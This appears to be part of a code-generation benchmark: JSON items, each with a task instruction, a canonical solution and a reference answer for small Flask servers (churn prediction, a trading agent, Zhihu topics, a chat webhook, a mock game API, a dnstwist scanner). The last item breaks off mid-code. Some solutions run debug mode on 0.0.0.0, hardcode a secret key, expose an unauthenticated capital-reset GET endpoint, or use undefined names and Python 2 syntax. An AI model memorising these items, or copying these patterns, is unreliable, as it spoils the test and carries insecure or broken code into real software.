    "Instruction": "Task Description: Create a Flask-based web service that predicts customer churn probability using a pre-trained machine learning model and feature transformation pipeline.\n\nFunction Description: The function implements a prediction endpoint for a Flask web service that takes customer data as input, applies feature transformation, makes a churn probability prediction using a pre-trained model, and returns the prediction results in JSON format.\n\nInput: \n- HTTP POST request with JSON body containing customer features/attributes\n- The function internally uses two pre-loaded artifacts:\n  - 'dv.bin': A feature transformation pipeline (DictVectorizer)\n  - 'model1.bin': A pre-trained machine learning model\n\nOutput: \n- JSON response containing:\n  - 'churn_probability': float value representing the predicted probability of churn (between 0 and 1)\n  - 'churn': boolean indicating whether the customer is predicted to churn (probability \u2265 0.5)",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nfrom flask import jsonify\nimport pickle\n\ndef load(filename):\n    with open(filename, 'rb') as f_in:\n        return pickle.load(f_in)\n\ndv = load('dv.bin')\nmodel = load('model1.bin')\n\napp = Flask('churn')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    customer = request.get_json()\n    X = dv.transform([customer])\n    y_pred = model.predict_proba(X)[0, 1]\n    churn = y_pred >= 0.5\n    result = {\n        'churn_probability': float(y_pred),\n        'churn': bool(churn)\n    }\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host='0.0.0.0', port=9696)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport pickle\n\napp = Flask(__name__)\n\n# Load the feature transformation pipeline and pre-trained model\nwith open('dv.bin', 'rb') as f:\n    dv = pickle.load(f)\n\nwith open('model1.bin', 'rb') as f:\n    model = pickle.load(f)\n\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    customer_data = request.get_json()\n\n    # Transform input data using the feature transformation pipeline\n    X = dv.transform([customer_data])\n\n    # Predict churn probability\n    churn_probability = model.predict_proba(X)[:, 1][0]\n\n    # Determine churn prediction (True if probability >= 0.5)\n    churn = bool(churn_probability >= 0.5)\n\n    # Return prediction results in JSON format\n    return jsonify({\n        'churn_probability': float(churn_probability),\n        'churn': churn\n    })\n\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Create a Flask-based HTTP server that provides endpoints to interact with an agent's trading system, including checking inventory, queue, balance, executing trades, and resetting capital.\n\nFunction Description: The code establishes a RESTful API using Flask that allows clients to query and modify the state of a trading agent. Each endpoint handles specific functionality and returns JSON responses.\n\nInput:\n- For '/trade' endpoint: GET request with 'data' parameter in query string containing trade details as JSON\n- For '/reset' endpoint: GET request with 'money' parameter in query string containing new capital amount as JSON\n- Other endpoints: GET requests without parameters\n\nOutput:\n- All endpoints return JSON responses:\n  - '/': {'status': 'OK'}\n  - '/inventory': Agent's inventory data\n  - '/queue': Agent's queue data\n  - '/balance': Agent's capital amount\n  - '/trade': Result of trade operation\n  - '/reset': Boolean confirmation of capital reset",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/', methods = ['GET'])\ndef hello():\n    return jsonify({'status': 'OK'})\n\n@app.route('/inventory', methods = ['GET'])\ndef inventory():\n    return jsonify(agent._inventory)\n\n@app.route('/queue', methods = ['GET'])\ndef queue():\n    return jsonify(agent._queue)\n\n@app.route('/balance', methods = ['GET'])\ndef balance():\n    return jsonify(agent._capital)\n\n@app.route('/trade', methods = ['GET'])\ndef trade():\n    data = json.loads(request.args.get('data'))\n    return jsonify(agent.trade(data))\n\n@app.route('/reset', methods = ['GET'])\ndef reset():\n    money = json.loads(request.args.get('money'))\n    agent.reset_capital(money)\n    return jsonify(True)\n\nif __name__ == '__main__':\n    app.run(host = '0.0.0.0', port = 8005)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\nclass TradingAgent:\n    def __init__(self):\n        self.inventory = {}\n        self.queue = []\n        self.capital = 10000\n\n    def execute_trade(self, trade_data):\n        # Implement actual trade execution logic here\n        # This is a placeholder that just adds to queue\n        self.queue.append(trade_data)\n        return {\"result\": \"Trade executed\"}\n\nagent = TradingAgent()\n\n@app.route('/')\ndef status():\n    return jsonify({'status': 'OK'})\n\n@app.route('/inventory')\ndef get_inventory():\n    return jsonify(agent.inventory)\n\n@app.route('/queue')\ndef get_queue():\n    return jsonify(agent.queue)\n\n@app.route('/balance')\ndef get_balance():\n    return jsonify({'balance': agent.capital})\n\n@app.route('/trade')\ndef handle_trade():\n    trade_data = request.args.get('data')\n    if not trade_data:\n        return jsonify({'error': 'No trade data provided'}), 400\n    \n    try:\n        trade_json = json.loads(trade_data)\n    except json.JSONDecodeError:\n        return jsonify({'error': 'Invalid JSON format'}), 400\n    \n    result = agent.execute_trade(trade_json)\n    return jsonify(result)\n\n@app.route('/reset')\ndef reset_capital():\n    money_data = request.args.get('money')\n    if not money_data:\n        return jsonify({'error': 'No amount provided'}), 400\n    \n    try:\n        money_json = json.loads(money_data)\n        new_capital = money_json['amount']\n    except (json.JSONDecodeError, KeyError):\n        return jsonify({'error': 'Invalid money format'}), 400\n    \n    agent.capital = new_capital\n    return jsonify({'reset': True})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Flask-based HTTP server that provides endpoints for retrieving Zhihu (a Chinese Q&A platform) topic data, including topic lists and specific topic details.\n\nFunction Description: The server exposes two main endpoints:\n1. `/zhihu_get_topics_list/` - Searches for topics matching a given keyword\n2. `/zhihu_get_topics_data/` - Retrieves detailed data for a specific topic\n\nInput: \n- For `/zhihu_get_topics_list/`: \n  - POST request with form parameter \"key\" (string) - the search keyword\n- For `/zhihu_get_topics_data/`:\n  - POST request with form parameters:\n    - \"id\" (string) - topic ID\n    - \"name\" (string) - topic name\n\nOutput:\n- For `/zhihu_get_topics_list/`:\n  - JSON response with structure:\n    {\n      \"success\": integer (1 for success, 0 for failure),\n      \"data\": list of objects with \"id\" and \"name\" for matching topics\n    }\n- For `/zhihu_get_topics_data/`:\n  - JSON response containing detailed topic data (structure depends on GetData_zhihu implementation)\n\nThe server maintains caches for:\n1. All available topics (zhihu_all_topics)\n2. Search results (zhihu_all_topics_key)\n3. Initial topic data (zhihu_init_topics)",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport logging\nimport GetData_zhihu\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"hard to guess string\"\n\nzhihu_all_topics = GetData_zhihu.get_all_topics()\nzhihu_all_topics_key = {}\nzhihu_init_topics = GetData_zhihu.get_topic_data(topic_id=\"19559424\", topic_name=\"\u6570\u636e\u5206\u6790\")\n\n@app.route(\"/zhihu_get_topics_list/\", methods=[\"post\"])\ndef zhihu_get_topics_list():\n    key = request.form.get(\"key\")\n    result = {\"success\": 1, \"data\": []}\n    if key:\n        if key in zhihu_all_topics_key:\n            result = zhihu_all_topics_key[key]\n        else:\n            for item in zhihu_all_topics:\n                if item[1].find(key) >= 0:\n                    result[\"data\"].append({\"id\": item[0], \"name\": item[1]})\n            if len(result[\"data\"]) > 0:\n                result[\"success\"] = 1\n                zhihu_all_topics_key[key] = result\n                logging.debug(\"all_topics_key increase: %s\", len(zhihu_all_topics_key))\n    return jsonify(result)\n\n@app.route(\"/zhihu_get_topics_data/\", methods=[\"post\"])\ndef zhihu_get_topics_data():\n    if request.form[\"id\"] == \"19554449\":\n        result = zhihu_init_topics\n    else:\n        result = GetData_zhihu.get_topic_data(request.form[\"id\"], request.form[\"name\"])\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=logging.DEBUG, format=\"%(asctime)s\\t%(levelname)s\\t%(message)s\")\n    logging.debug(\"app url_map: %s\", app.url_map)\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport threading\n\napp = Flask(__name__)\n\nzhihu_all_topics = {}\nzhihu_all_topics_key = {}\nzhihu_init_topics = {}\n\ndef search_topics(key):\n    if key in zhihu_all_topics_key:\n        return zhihu_all_topics_key[key]\n    \n    results = []\n    for topic_id, topic_name in zhihu_all_topics.items():\n        if key.lower() in topic_name.lower():\n            results.append({\"id\": topic_id, \"name\": topic_name})\n    \n    zhihu_all_topics_key[key] = results\n    return results\n\ndef get_topic_data(topic_id, topic_name):\n    cache_key = f\"{topic_id}_{topic_name}\"\n    if cache_key in zhihu_init_topics:\n        return zhihu_init_topics[cache_key]\n    \n    try:\n        data = GetData_zhihu(topic_id, topic_name)\n        zhihu_init_topics[cache_key] = data\n        return data\n    except Exception as e:\n        print(f\"Error fetching data for topic {topic_id} ({topic_name}): {e}\")\n        return {\"error\": str(e)}\n\n@app.route('/zhihu_get_topics_list/', methods=['POST'])\ndef get_topics_list():\n    key = request.form.get('key')\n    if not key:\n        return jsonify({\"success\": 0, \"error\": \"Missing 'key' parameter\"}), 400\n    \n    results = search_topics(key)\n    return jsonify({\"success\": 1, \"data\": results})\n\n@app.route('/zhihu_get_topics_data/', methods=['POST'])\ndef get_topics_data():\n    topic_id = request.form.get('id')\n    topic_name = request.form.get('name')\n    \n    if not topic_id or not topic_name:\n        return jsonify({\"success\": 0, \"error\": \"Missing 'id' or 'name' parameter\"}), 400\n    \n    data = get_topic_data(topic_id, topic_name)\n    return jsonify({\"success\": 1, \"data\": data})\n\ndef run_server():\n    app.run(host='0.0.0.0', port=5000)\n\nif __name__ == '__main__':\n    server_thread = threading.Thread(target=run_server)\n    server_thread.daemon = True\n    server_thread.start()\n    \n    try:\n        while True:\n            pass\n    except KeyboardInterrupt:\n        print(\"Shutting down server...\")"
  },
  {
    "Task_id": 188,
    "Instruction": "Task Description: Create a Flask-based web application that handles form submissions and displays responses, using a class structure to encapsulate the application logic.\n\nClass Description: The `FlaskApp` class encapsulates a Flask web application that provides two routes: a main page with a form and a submission handler that processes the form data. It uses WTForms for form validation and template rendering for responses.\n\nAttributes:\n\napp: [Flask] - The Flask application instance that handles HTTP requests and routes.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the Flask application and sets up the routes by calling _setup_routes.\n\n_setup_routes: [Name]() -> [None] - Configures the application routes by binding URL paths to their respective handler methods.\n\nindex: [Name]() -> [str] - Handles requests to the root URL ('/'), renders and returns the main form page using the 'first_app.html' template with an instance of HelloForm.\n\nhello: [Name]() -> [str] - Handles POST requests to the '/hello' URL, validates the submitted form data, and either renders a greeting page ('hello.html') with the submitted name or returns the form page with validation errors.\n\nrun: [Name](debug: [bool] = True) -> [None] - Starts the Flask development server with optional debug mode enabled.",
    "Canonical_solution": "from flask import Flask, request\nfrom wtforms import Form, TextAreaField, validators\n\nclass HelloForm(Form):\n    sayhello = TextAreaField('', [validators.DataRequired()])\n\nclass FlaskApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/hello', methods=['POST'])(self.hello)\n\n    def index(self):\n        form = HelloForm(request.form)\n        return render_template('first_app.html', form=form)\n\n    def hello(self):\n        form = HelloForm(request.form)\n        if request.method == 'POST' and form.validate():\n            name = request.form['sayhello']\n            return render_template('hello.html', name=name)\n        return render_template('first_app.html', form=form)\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, request\nfrom wtforms import Form, StringField, validators\n\nclass HelloForm(Form):\n    name = StringField('Name', [validators.DataRequired()])\n\nclass FlaskApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/', 'index', self.index, methods=['GET'])\n        self.app.add_url_rule('/hello', 'hello', self.hello, methods=['POST'])\n\n    def index(self):\n        form = HelloForm(request.form)\n        return render_template('first_app.html', form=form)\n\n    def hello(self):\n        form = HelloForm(request.form)\n        if form.validate():\n            return render_template('hello.html', name=form.name.data)\n        return render_template('first_app.html', form=form), 400\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)"
  },
  {
    "Task_id": 189,
    "Instruction": "Task Description: Create a Flask-based web server that handles both GET and POST requests for a messaging webhook, verifying tokens and processing incoming messages or postbacks from a chat platform.\n\nFunction Description: The code implements a Flask application with two main route handlers:\n1. handle_verification: Handles GET requests for webhook verification by checking a token\n2. handle_messages: Processes POST requests containing message or postback events from users\n\nInput:\n- For handle_verification:\n  - GET request with query parameters:\n    - hub.verify_token: Token to verify webhook authenticity\n    - hub.challenge: Challenge string to return if verification succeeds\n- For handle_messages:\n  - POST request with JSON payload containing:\n    - Either message events (text, attachments, quick replies) or postback events\n    - Sender information and message content\n\nOutput:\n- For handle_verification:\n  - Returns the hub.challenge string if verification succeeds\n  - Returns a rendered HTML template if verification fails\n- For handle_messages:\n  - Returns \"ok\" status after processing messages\n  - May send responses back to users through the messaging platform\n  - Handles various message types (text, location, audio) and postbacks\n\nAdditional Helper Functions:\n- get_type_from_payload: Identifies whether payload contains message or postback\n- postback_events: Generator that yields sender_id and postback payload\n- messaging_events: Generator that processes different message types and yields structured data",
    "Canonical_solution": "import sys, json\nfrom flask import Flask, request, g, session, render_template, redirect, url_for, flash\nfrom flask_oauth import OAuth\n\napplication = Flask(__name__, instance_relative_config=True, static_url_path='')\napplication.config.from_object('config')\napplication.config.from_pyfile('config.py', silent=True)\napp = application\n\n@app.route('/', methods=['GET'])\ndef handle_verification():\n    if request.args.get('hub.verify_token', '') == app.config['OWN_WEBHOOK_TOKEN']:\n        return request.args.get('hub.challenge', '')\n    else:\n        return render_template('index.html')\n\n@app.route('/', methods=['POST'])\ndef handle_messages():\n    payload = request.get_data()\n    token = app.config['PAT']\n    webhook_type = get_type_from_payload(payload)\n\n    if webhook_type == 'postback':\n        for sender_id, postback_payload in postback_events(payload):\n            if postback_payload == 'OPTIMIST_HELP':\n                handle_help(sender_id)\n            elif postback_payload == 'OPTIMIST_GET_STARTED':\n                if not Mongo.user_exists(users, sender_id):\n                    g.user = Mongo.get_user_mongo(users, sender_id)\n                    return handle_first_time_user(users, g.user)\n\n    elif webhook_type == 'message':\n        for sender_id, message in messaging_events(payload):\n            if not message:\n                return \"ok\"\n            global temp_message_id \n            mid = message['message_id']\n            if mid == temp_message_id:\n                return 'ok'\n            temp_message_id = mid\n\n            try:\n                FB.show_typing(token, sender_id)\n                response = processIncoming(sender_id, message)\n                FB.show_typing(token, sender_id, 'typing_off')\n\n                if response is not None and response != 'pseudo':\n                    FB.send_message(token, sender_id, response)\n                elif response != 'pseudo':\n                    if NLP.randOneIn(7):\n                        FB.send_message(token, sender_id, NLP.oneOf(NLP.no_response))\n            except Exception, e:\n                FB.send_message(app.config['PAT'], sender_id, NLP.oneOf(NLP.error))\n                Mongo.pop_context(users, g.user)\n    return \"ok\"\n\ndef get_type_from_payload(payload):\n    data = json.loads(payload)\n    if \"postback\" in data[\"entry\"][0][\"messaging\"][0]:\n        return \"postback\"\n    elif \"message\" in data[\"entry\"][0][\"messaging\"][0]:\n        return \"message\"\n\ndef postback_events(payload):\n    data = json.loads(payload)\n    postbacks = data[\"entry\"][0][\"messaging\"]\n    for event in postbacks:\n        sender_id = event[\"sender\"][\"id\"]\n        postback_payload = event[\"postback\"][\"payload\"]\n        yield sender_id, postback_payload\n\ndef messaging_events(payload):\n    data = json.loads(payload)\n    messaging_events = data[\"entry\"][0][\"messaging\"]\n    for event in messaging_events:\n        sender_id = event[\"sender\"][\"id\"]\n        if \"message\" not in event:\n            yield sender_id, None\n        if \"message\" in event and \"text\" in event[\"message\"] and \"quick_reply\" not in event[\"message\"]:\n            data = event[\"message\"][\"text\"].encode('unicode_escape')\n            yield sender_id, {'type':'text', 'data': data, 'message_id': event['message']['mid']}\n        elif \"attachments\" in event[\"message\"]:\n            if \"location\" == event['message']['attachments'][0][\"type\"]:\n                coordinates = event['message']['attachments'][0]['payload']['coordinates']\n                yield sender_id, {'type':'location','data':[coordinates['lat'], coordinates['long']],'message_id': event['message']['mid']}\n            elif \"audio\" == event['message']['attachments'][0][\"type\"]:\n                audio_url = event['message']['attachments'][0]['payload']['url']\n                yield sender_id, {'type':'audio','data': audio_url, 'message_id': event['message']['mid']}\n            else:\n                yield sender_id, {'type':'text','data':\"I don't understand this\", 'message_id': event['message']['mid']}\n        elif \"quick_reply\" in event[\"message\"]:\n            data = event[\"message\"][\"quick_reply\"][\"payload\"]\n            yield sender_id, {'type':'quick_reply','data': data, 'message_id': event['message']['mid']}\n        else:\n            yield sender_id, {'type':'text','data':\"I don't understand this\", 'message_id': event['message']['mid']}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport json\n\napp = Flask(__name__)\n\nVERIFY_TOKEN = \"your_verification_token\"\nPAGE_ACCESS_TOKEN = \"your_page_access_token\"\n\ndef get_type_from_payload(payload):\n    if 'object' in payload:\n        if 'entry' in payload:\n            for entry in payload['entry']:\n                if 'messaging' in entry:\n                    for event in entry['messaging']:\n                        if 'message' in event:\n                            return 'message'\n                        elif 'postback' in event:\n                            return 'postback'\n    return None\n\ndef postback_events(payload):\n    for entry in payload['entry']:\n        for event in entry['messaging']:\n            sender_id = event['sender']['id']\n            postback = event['postback']\n            yield (sender_id, postback)\n\ndef messaging_events(payload):\n    for entry in payload['entry']:\n        for event in entry['messaging']:\n            sender_id = event['sender']['id']\n            message = event.get('message')\n            if message:\n                text = message.get('text')\n                attachments = message.get('attachments')\n                quick_reply = message.get('quick_reply')\n                yield ('message', sender_id, text, attachments, quick_reply)\n            elif event.get('postback'):\n                postback = event['postback']\n                yield ('postback', sender_id, postback.get('payload'))\n\n@app.route('/webhook', methods=['GET'])\ndef handle_verification():\n    hub_mode = request.args.get('hub.mode')\n    hub_challenge = request.args.get('hub.challenge')\n    hub_verify_token = request.args.get('hub.verify_token')\n\n    if hub_verify_token == VERIFY_TOKEN:\n        return hub_challenge\n    else:\n        return render_template('error.html'), 403\n\n@app.route('/webhook', methods=['POST'])\ndef handle_messages():\n    payload = request.get_json()\n    event_type = get_type_from_payload(payload)\n\n    if event_type == 'message':\n        for event in messaging_events(payload):\n            msg_type, sender_id, content = event[0], event[1], event[2:]\n            # Process message based on type\n            print(f\"Received message from {sender_id}: {content}\")\n            # Add your message handling logic here\n\n    elif event_type == 'postback':\n        for sender_id, postback in postback_events(payload):\n            print(f\"Received postback from {sender_id}: {postback.get('payload')}\")\n            # Add your postback handling logic here\n\n    return \"ok\"\n\nif __name__ == '__main__':\n    app.run(port=5000, debug=True)"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Flask-based HTTP server that simulates a RocketMap API endpoint server, capable of generating and returning mock data for gyms and pok\u00e9stops based on geographic coordinates and radius.\n\nFunction Description: The server provides three main endpoints:\n1. Root endpoint ('/') - Returns a simple welcome message\n2. Login endpoint ('/login/<lat>/<lng>/<r>') - Generates and returns gym and pok\u00e9stop data within a specified radius of given coordinates\n3. Scan endpoint ('/scan/<lat>/<lng>') - Returns mock scan data including nearby forts and wild pok\u00e9mons for given coordinates\n\nInput:\n- For root endpoint: None\n- For login endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n  - r: [string] - Radius in meters as string\n- For scan endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n\nOutput:\n- For root endpoint: [string] - Welcome message\n- For login endpoint: [JSON] - List of generated gyms and pok\u00e9stops with their properties\n- For scan endpoint: [JSON] - Mock scan data including cells with forts and wild pok\u00e9mons",
    "Canonical_solution": "from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/')\ndef api_root():\n    return 'This here be a Fake RocketMap API Endpoint Server'\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef api_login(lat, lng, r):\n    global forts\n\n    if len(forts):\n        # already generated\n        return jsonify(forts)\n\n    # coerce types\n    r = int(r)  # radius in meters\n    lat = float(lat)\n    lng = float(lng)\n\n    forts = []\n    area = 3.14 * (r * r)\n\n    # One gym every N sq.m\n    gymCount = int(math.ceil(area / 25000))\n\n    # One pks every N sq.m\n    pksCount = int(math.ceil(area / 15000))\n\n    # Gyms\n    for i in range(gymCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'guard_pokemon_id': randint(1, 140),\n            'gym_points': randint(1, 30000),\n            'id': 'gym-{}'.format(i),\n            'is_in_battle': not getrandbits(1),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'owned_by_team': randint(0, 3)\n        })\n\n    # Pokestops\n    for i in range(pksCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'id': 'pks-{}'.format(i),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'type': 1\n        })\n\n    log.info('Login for location %f,%f generated %d gyms, %d pokestop', lat,\n             lng, gymCount, pksCount)\n    return jsonify(forts)\n\n@app.route('/scan/<lat>/<lng>')\ndef api_scan(lat, lng):\n    location = (float(lat), float(lng))\n    cells = []\n    # for i in range(randint(60,70)):\n    for i in range(3):\n        cells.append({\n            'current_timestamp_ms': int(time() * 1000),\n            'forts': getForts(location),\n            's2_cell_id': uuid4(),  # wrong, but also unused so it\n                                    # doesn't matter\n            'wild_pokemons': makeWildPokemon(location),\n            'catchable_pokemons': [],  # unused\n            'nearby_pokemons': []  # unused\n        })\n    return jsonify({'responses': {'GET_MAP_OBJECTS': {'map_cells': cells}}})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, jsonify\nimport random\nimport math\n\napp = Flask(__name__)\n\ndef generate_fort_data(lat, lng, fort_type):\n    count = random.randint(2, 5)\n    forts = []\n    for _ in range(count):\n        angle = random.uniform(0, 360)\n        distance = random.uniform(0.01, 0.05)  # Convert to meters later if needed\n        new_lat = lat + (distance * math.cos(math.radians(angle)))\n        new_lng = lng + (distance * math.sin(math.radians(angle)))\n        \n        forts.append({\n            \"id\": f\"fort_{random.randint(100000, 999999)}\",\n            \"latitude\": new_lat,\n            \"longitude\": new_lng,\n            \"last_modified_timestamp_ms\": random.randint(1600000000000, 1700000000000),\n            \"type\": fort_type,\n            \"team\": random.randint(0, 3),\n            \"guard_pokemon_id\": random.randint(1, 151) if fort_type == 1 else None,\n            \"gym_points\": random.randint(0, 50000) if fort_type == 1 else None,\n            \"enabled\": True,\n            \"image_url\": \"https://example.com/fort_image.png\"\n        })\n    return forts\n\ndef generate_wild_pokemon(lat, lng):\n    count = random.randint(1, 3)\n    wild_pokemon = []\n    for _ in range(count):\n        angle = random.uniform(0, 360)\n        distance = random.uniform(0.01, 0.05)\n        new_lat = lat + (distance * math.cos(math.radians(angle)))\n        new_lng = lng + (distance * math.sin(math.radians(angle)))\n        \n        wild_pokemon.append({\n            \"encounter_id\": random.randint(100000000000000000, 999999999999999999),\n            \"spawnpoint_id\": f\"sp_{random.randint(1000000, 9999999)}\",\n            \"pokemon_id\": random.randint(1, 151),\n            \"latitude\": new_lat,\n            \"longitude\": new_lng,\n            \"disappear_time\": random.randint(1600000000, 1700000000),\n            \"gender\": random.randint(1, 3),\n            \"form\": random.randint(1, 3) if random.random() < 0.3 else None\n        })\n    return wild_pokemon\n\n@app.route('/')\ndef home():\n    return \"Welcome to RocketMap API Simulation Server\"\n\n@app.route('/login/<string:lat>/<string:lng>/<string:r>')\ndef login(lat, lng, r):\n    try:\n        lat = float(lat)\n        lng = float(lng)\n        r = float(r)\n    except ValueError:\n        return jsonify({\"error\": \"Invalid coordinates or radius\"}), 400\n        \n    gyms = generate_fort_data(lat, lng, 1)\n    pokestops = generate_fort_data(lat, lng, 0)\n    \n    result = {\n        \"gyms\": gyms,\n        \"pokestops\": pokestops\n    }\n    \n    return jsonify(result)\n\n@app.route('/scan/<string:lat>/<string:lng>')\ndef scan(lat, lng):\n    try:\n        lat = float(lat)\n        lng = float(lng)\n    except ValueError:\n        return jsonify({\"error\": \"Invalid coordinates\"}), 400\n    \n    cell_count = random.randint(2, 4)\n    cells = []\n    \n    for _ in range(cell_count):\n        cell_lat = lat + random.uniform(-0.01, 0.01)\n        cell_lng = lng + random.uniform(-0.01, 0.01)\n        \n        cell = {\n            \"s2_cell_id\": random.randint(1000000000000000000, 9999999999999999999),\n            \"forts\": generate_fort_data(cell_lat, cell_lng, random.choice([0, 1])),\n            \"wild_pokemons\": generate_wild_pokemon(cell_lat, cell_lng)\n        }\n        cells.append(cell)\n    \n    return jsonify({\"cells\": cells})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 192,
    "Instruction": "Task Description: Create a Flask-based API for domain name permutation and scanning using dnstwist library, with session management and various output formats.\n\nClass Description: DNSTwistAPI is a Flask application that provides RESTful endpoints for generating domain permutations, scanning for registered domains, and returning results in multiple formats. It manages concurrent scan sessions with cleanup functionality.\n\nAttributes:\n\napp: [Flask] - The Flask application instance\nsessions: [list] - List of active scan sessions\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the Flask app, sets up routes, and starts the session janitor thread\n_setup_routes: [Name]() -> [None] - Configures all API endpoints and their handlers\n_start_janitor: [Name]() -> [None] - Starts the background thread for cleaning up expired sessions\njanitor: [Name](sessions) -> [None] - Background thread that cleans up completed or expired sessions\nroot: [Name]() -> [Response] - Serves the web application's main page\napi_scan: [Name]() -> [tuple(Response, int)] - Creates a new scan session and starts domain permutation\napi_status: [Name](sid) -> [Response] - Returns the status of a specific scan session\napi_domains: [Name](sid) -> [Response] - Returns registered domains from a scan session\napi_csv: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results in CSV format\napi_json: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results in JSON format\napi_list: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results as plain text list\napi_stop: [Name](sid) -> [Response] - Stops a running scan session\nrun: [Name](host, port) -> [None] - Starts the Flask application server",
    "Canonical_solution": "from flask import Flask, request, jsonify, send_from_directory\nimport dnstwist\nimport os\nimport threading\nimport time\nfrom queue import Queue\nfrom uuid import uuid4\n\nclass Session:\n    def __init__(self, url, nameservers=None, thread_count=dnstwist.THREAD_COUNT_DEFAULT):\n        self.id = str(uuid4())\n        self.timestamp = int(time.time())\n        self.url = dnstwist.UrlParser(url)\n        self.nameservers = nameservers\n        self.thread_count = thread_count\n        self.jobs = Queue()\n        self.threads = []\n        self.fuzzer = dnstwist.Fuzzer(self.url.domain, dictionary=DICTIONARY, tld_dictionary=TLD_DICTIONARY)\n        self.fuzzer.generate()\n        self.permutations = self.fuzzer.permutations\n\n    def scan(self):\n        for domain in self.fuzzer.domains:\n            self.jobs.put(domain)\n        for _ in range(self.thread_count):\n            worker = dnstwist.Scanner(self.jobs)\n            worker.option_extdns = dnstwist.MODULE_DNSPYTHON\n            worker.option_geoip = dnstwist.MODULE_GEOIP\n            if self.nameservers:\n                worker.nameservers = self.nameservers.split(',')\n            worker.start()\n            self.threads.append(worker)\n\n    def stop(self):\n        self.jobs.queue.clear()\n        for worker in self.threads:\n            worker.stop()\n        for worker in self.threads:\n            worker.join()\n        self.threads.clear()\n\n    def domains(self):\n        return self.permutations(registered=True, unicode=True)\n\n    def status(self):\n        total = len(self.permutations())\n        remaining = max(self.jobs.qsize(), len(self.threads))\n        complete = total - remaining\n        registered = len(self.permutations(registered=True))\n        return {\n            'id': self.id,\n            'timestamp': self.timestamp,\n            'url': self.url.full_uri(),\n            'domain': self.url.domain,\n            'total': total,\n            'complete': complete,\n            'remaining': remaining,\n            'registered': registered\n        }\n\n    def csv(self):\n        return dnstwist.Format(self.permutations(registered=True)).csv()\n\n    def json(self):\n        return dnstwist.Format(self.permutations(registered=True)).json()\n\n    def list(self):\n        return dnstwist.Format(self.permutations()).list()\n\nclass DNSTwistAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.sessions = []\n        self._setup_routes()\n        self._start_janitor()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.root)\n        self.app.route('/api/scans', methods=['POST'])(self.api_scan)\n        self.app.route('/api/scans/<sid>')(self.api_status)\n        self.app.route('/api/scans/<sid>/domains')(self.api_domains)\n        self.app.route('/api/scans/<sid>/csv')(self.api_csv)\n        self.app.route('/api/scans/<sid>/json')(self.api_json)\n        self.app.route('/api/scans/<sid>/list')(self.api_list)\n        self.app.route('/api/scans/<sid>/stop', methods=['POST'])(self.api_stop)\n\n    def _start_janitor(self):\n        cleaner = threading.Thread(target=self.janitor, args=(self.sessions,))\n        cleaner.daemon = True\n        cleaner.start()\n\n    def janitor(self, sessions):\n        while True:\n            time.sleep(1)\n            for s in sorted(sessions, key=lambda x: x.timestamp):\n                if s.jobs.empty() and s.threads:\n                    s.stop()\n                    continue\n                if (s.timestamp + SESSION_TTL) < time.time():\n                    sessions.remove(s)\n                    continue\n\n    def root(self):\n        return send_from_directory(WEBAPP_DIR, WEBAPP_HTML)\n\n    def api_scan(self):\n        if sum([1 for s in self.sessions if not s.jobs.empty()]) >= SESSION_MAX:\n            return jsonify({'message': 'Too many scan sessions - please retry in a minute'}), 500\n        j = request.get_json(force=True)\n        if 'url' not in j:\n            return jsonify({'message': 'Bad request'}), 400\n        try:\n            _, domain, _ = dnstwist.domain_tld(j.get('url'))\n        except Exception:\n            return jsonify({'message': 'Bad request'}), 400\n        if len(domain) > DOMAIN_MAXLEN:\n            return jsonify({'message': 'Domain name is too long'}), 400\n        for block in DOMAIN_BLOCKLIST:\n            if str(block) in domain:\n                return jsonify({'message': 'Not allowed'}), 400\n        try:\n            session = Session(j.get('url'), 